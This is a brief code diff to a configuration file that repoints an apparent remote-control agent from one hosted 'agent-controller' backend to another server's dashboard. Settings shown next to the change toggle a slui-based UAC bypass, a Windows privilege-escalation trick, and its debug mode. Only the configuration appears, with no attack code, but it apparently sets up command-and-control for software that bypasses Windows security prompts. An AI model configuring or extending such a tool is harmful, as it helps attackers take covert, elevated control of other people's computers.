@@ -201,7 +201,8 @@ MAX_PROMPT_ATTEMPTS = 3     # Limit prompts to 3 attempts instead of 999
 
 # Controller URL override flag (set URL via env)
 USE_FIXED_SERVER_URL = True
-FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com')
+#FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com')
+FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://test-j2w7.onrender.com/dashboard')
 DISABLE_SLUI_BYPASS = True
 UAC_BYPASS_DEBUG_MODE = True
 
